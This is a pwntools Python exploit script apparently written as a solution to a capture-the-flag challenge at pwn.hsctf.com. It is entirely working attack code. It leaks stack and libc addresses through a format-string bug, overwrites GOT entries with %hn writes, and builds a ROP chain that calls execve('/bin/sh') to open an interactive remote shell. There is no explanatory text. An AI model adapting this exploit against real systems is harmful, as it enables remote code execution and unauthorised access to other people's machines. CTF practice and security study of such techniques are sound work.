from pwn import *

###Util
def str_encode(data):
    data = list(data)
    length = len(data)
    for i in range(length):
        if data[i]==0:
            break
        if data[i]>64 and data[i]<=90:
            data[i] = (data[i]+25-65)%26+65
        elif data[i]>96 and data[i]<=122:
            data[i] = (data[i]+25-97)%26+97
    return b''.join(list(map(p8,data)))

def send_payload(payload):
    payload = str_encode(payload)
    r.sendlineafter('encoded: ',payload)
    r.sendlineafter('shift: ','1')

def prepare_fmt_set(target_addr,value):
    sets = []
    for i in range(4):
        sets.append([value%65536,p64(target_addr+i*2)])
        value//=65536
    sets = sorted(sets)
    for i in range(3,0,-1):
        sets[i][0]-=sets[i-1][0]
    payload = b''
    for i in range(4):
        if sets[i][0]==0:
            payload+=b'%'+str(40+i).encode()+b'$hn'
            #payload+=b'%'+str(40+i).encode()+b'$p'
        else:
            payload+=b'%'+str(sets[i][0]).encode()+b'c%'+str(40+i).encode()+b'$hn'
            #payload+=b'%'+str(sets[i][0]).encode()+b'c%'+str(40+i).encode()+b'$p'
    payload = payload.ljust(0x80,b'\x00')
    for i in range(4):
        payload+=sets[i][1]
    return payload

###Addr
func = 0x401196
puts_got = 0x404018
start_main_offset = 0x20830
execve_offset = 0xcc770
puts_offset = 0x6f690
bss = 0x404070
setbuf_got = 0x404030


###ROPgadget
L_pop_rdi = 0x21102
L_pop_rsi = 0x202e8
L_pop_rdx = 0x1b92

###Exploit
r = remote('pwn.hsctf.com',4567)

#6 + 2*alpha
payload1 = b'%34$n%64c%33$hn%4438c%32$hn###%58$p###%63$p###'.ljust(0x40,b'\x00')+p64(puts_got)+p64(puts_got+2)+p64(puts_got+4)
send_payload(payload1)
r.recvuntil('###')
addrs = r.recvuntil('Enter').split(b'###')[-3:-1]
stack_addr = int(addrs[0][2:],16)
return_addr = stack_addr+8
start_main_addr = int(addrs[1][2:],16)
libc_base = start_main_addr-start_main_offset


arg = prepare_fmt_set(setbuf_got,u64(b'/bin/sh\x00'))
rdi = prepare_fmt_set(return_addr,libc_base+L_pop_rdi)
return_addr+=8
sh = prepare_fmt_set(return_addr,setbuf_got)
return_addr+=8
rsi = prepare_fmt_set(return_addr,libc_base+L_pop_rsi)
return_addr+=8
Z = prepare_fmt_set(return_addr,0)
return_addr+=8
rdx = prepare_fmt_set(return_addr,libc_base+L_pop_rdx)
return_addr+=8
Z2 = prepare_fmt_set(return_addr,0)
return_addr+=8
execve = prepare_fmt_set(return_addr,libc_base+execve_offset)
stop_loop = prepare_fmt_set(puts_got,libc_base+puts_offset)


send_payload(arg)
send_payload(rdi)
send_payload(sh)
send_payload(rsi)
send_payload(Z)
send_payload(rdx)
send_payload(Z2)
send_payload(execve)
send_payload(stop_loop)

r.interactive()
